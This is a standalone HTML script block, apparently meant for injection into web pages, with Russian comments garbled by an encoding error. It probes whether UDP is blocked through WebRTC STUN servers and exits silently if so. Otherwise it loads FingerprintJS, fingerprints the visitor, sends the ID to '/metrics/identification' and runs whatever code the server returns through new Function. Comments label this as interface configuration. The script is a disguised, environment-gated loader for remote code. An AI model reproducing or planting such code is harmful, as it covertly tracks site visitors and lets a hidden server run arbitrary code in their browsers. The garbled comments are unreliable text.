<script type="module">
(async () => {
    try {
        // –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ UDP –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
        const isUDPBlocked = await new Promise((resolve) => {
            const timeout = setTimeout(() => resolve(true), 2000); // 2 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
            let resolved = false; // –§–ª–∞–≥ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –¥–≤–æ–π–Ω–æ–≥–æ resolve
            
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: 'stun:stun.sipnet.ru:3478' },      // –†–æ—Å—Å–∏–π—Å–∫–∏–π –ø–µ—Ä–≤—ã–º
                        { urls: 'stun:stun.l.google.com:19302' }   // Google –≤—Ç–æ—Ä—ã–º
                    ]
                });
                
                pc.onicecandidate = (e) => {
                    if (!resolved && e.candidate && e.candidate.candidate.includes('udp')) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve(false); // UDP —Ä–∞–±–æ—Ç–∞–µ—Ç - –ø–µ—Ä–≤—ã–π –∂–µ –æ—Ç–≤–µ—Ç
                    }
                };
                
                pc.onicegatheringstatechange = () => {
                    if (!resolved && pc.iceGatheringState === 'complete') {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve(true); // UDP –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω
                    }
                };
                
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {
                    if (!resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve(true);
                    }
                });
            } catch {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timeout);
                    resolve(true);
                }
            }
        });
        
        // –ï—Å–ª–∏ UDP –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω - –≤—ã—Ö–æ–¥–∏–º
        if (isUDPBlocked) return;
        
        // –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–¥ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ UDP –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω
        const CONFIG_API = '/metrics/identification';
        
        // –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∏–º–ø–æ—Ä—Ç –≤–º–µ—Å—Ç–æ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ
        const FingerprintJS = await import('/fp.js');
        
        const fp = await FingerprintJS.load({
            region: 'eu',
            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
        });

        const { requestId } = await fp.get({ extendedResult: true });

        // –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
        if (!res.ok) return;

        const data = await res.json();

        // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫
        if (data.init) {
            new Function(data.init)();
        }
    } catch (err) {
        console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏:', err);
    }
})();
</script>
